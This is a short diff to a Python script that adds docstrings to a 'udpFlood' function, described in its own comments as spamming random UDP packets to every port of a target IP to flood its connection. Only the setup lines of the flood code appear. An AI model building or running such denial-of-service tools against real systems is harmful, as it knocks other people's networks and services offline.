@@ -1,4 +1,6 @@
 #!/usr/bin/python
+# -*- coding: utf-8 -*-
+'''Spam sends UDP packets to target to flood his connection'''
 import socket
 import random
 
@@ -6,6 +8,12 @@ import random
 #Gets ip and Verbouse flag
 #Sends random udp packets to every port in target
 def udpFlood(ip, Verbouse):
+    '''Spam sends UDP packets to target to flood his connection
+    ip:
+        Target Ip
+    Verbouse:
+        Print more information'''
+
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     bytas = random._urandom(1024) #creates packet
     sent = 0
